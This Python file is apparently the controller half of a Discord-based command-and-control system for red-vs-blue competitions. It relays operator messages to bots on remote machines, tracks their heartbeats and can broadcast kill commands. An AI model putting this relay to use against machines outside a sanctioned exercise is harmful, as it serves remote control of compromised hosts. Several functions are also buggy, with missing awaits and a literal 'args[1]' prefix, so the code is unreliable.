import asyncio
import socket

import discord
from discord.ext import commands

from discordChannel import discordChannel

"""
This program uses py-cord to create and manage minion bot instances running on remote machines. 
This instance is the "Command" or C instance, which means it does not run commands and is intended to be run on
an out of scope computer. It has three main jobs:
  - Rename and organize channels created by minions to make them more human readable. 
  - Keep track of what remotes are still active and clean up after them if they die
  - Manage channels for mass commanding remotes

Intended for red vs blue competitions.

Author: Asa Horn
"""
bot = commands.Bot(command_prefix='!')
client = discord.Client()
guild = discord.guild
channels = []
allBotChannel = discordChannel()
aliveRemotes = 0
cwd = '/'

@bot.event
async def on_ready():
    print('Starting controller. Use !start to begin')

@bot.event
async def on_message(ctx):
    await handleMessage(ctx)
    await bot.process_commands(ctx)


async def handleMessage(ctx):
    if ctx.content[0] == '!':
        if ctx.content == '!buBum':
            await buBum(ctx)
        elif ctx.content == '!addChannel':
            await addChannel(ctx)
    if ctx.channel != allBotChannel.ID:
        return
    for remote in channels:  # repeat everything said in all command to every remotes command channel
        await remote.ID.send(ctx.content)

@bot.command()
async def start(ctx):
    global allBotChannel
    print(f'Starting in guild {ctx.guild}')
    await doHeartBeat()
    allBotChannel.ID = await ctx.guild.create_text_channel('all-bots-command')

@bot.command()
async def changePrefix(ctx, *args):
    global bot
    if len(args) != 1:
        await ctx.channel.send('usage changePrefix [new prefix(string)]')
        return
    bot = commands.Bot(command_prefix='args[1]')

@bot.command()
async def clean(ctx):
    channelsToClean = []
    listOfNames = ""
    for remote in channels:
        if not remote.alive:
            channelsToClean.append(remote)
            listOfNames += remote.ID + '\n'

    ctx.channel.send('`You are about to delete ' + str(len(channelsToClean)) + 'channels. Are you sure? '
                     '(y/n)\n' + listOfNames)\

    check = lambda m: m.author == ctx.author and m.channel == ctx.channel
    try:
        msg = await bot.wait_for("message", check=check, timeout=10)
    except asyncio.TimeoutError:
        await ctx.channel.send("`Canceled mass delete, time out.")
        return

    if msg.content == "yes" or msg.content == "y" or msg.content == "'yes" or msg.content == "'y":
        for remote in channelsToClean:
            remote.ID.delete()
        ctx.channel.send('`Dead channels removed')
        return
    ctx.channel.send('`Mass delete canceled.')

@bot.command()
async def killAll(ctx):
    ctx.channel.send('`You are about to kill ' + str(aliveRemotes) + 'remotes. Are you sure? (y/n)')

    check = lambda m: m.author == ctx.author and m.channel == ctx.channel
    try:
        msg = await bot.wait_for("message", check=check, timeout=10)
    except asyncio.TimeoutError:
        await ctx.channel.send("`Canceled mass kill, time out.")
        return

    if msg.content == "yes" or msg.content == "y" or msg.content == "'yes" or msg.content == "'y":
        allBotChannel.ID.send('@REM kill')
        ctx.channel.send('`kill commands send')
        return
    ctx.channel.send('`Mass kill canceled.')


@bot.command()
async def nuke(ctx):
    await killAll(ctx)
    await clean(ctx)

@bot.command()
async def buBum(ctx):
    #mark the remote owning the channel this was called from as still active.
    for remote in channels:
        if remote.ID == ctx.channel:
            remote.heartBeatResponse = True
            await ctx.delete()
            return
    ctx.channel.send('`Error, this channel is not recognized as a command channel')


@bot.command()
async def addChannel(ctx):
    global aliveRemotes
    print('Adding new remote :)')
    channels.append(discordChannel(ctx.channel))
    aliveRemotes += 1
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,
                                                        name=f"{aliveRemotes} remotes"))


async def doHeartBeat():
    global aliveRemotes
    while True:
        print('starting heartBeat')
        for remote in channels:
            if not remote.heartBeatResponse and remote.alive:  #If the remote didn't respond last time it is dead
                remote.alive = False
                aliveRemotes -= 1
                await remote.ID.send('`*Remote failed to respond. Assuming it is dead*')

            await remote.ID.send('@REM heartBeat')  #send out new heartbeats
            remote.heartBeatResponse = False
        if aliveRemotes > 0:
            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,
                                                                name=f"{aliveRemotes} remotes"))
        await asyncio.sleep(120)

######################################################Command init
def main(*args):
    with open('secrets.txt') as f:
        secret = f.read()
        bot.run(secret)


if __name__ == '__main__':
    main()
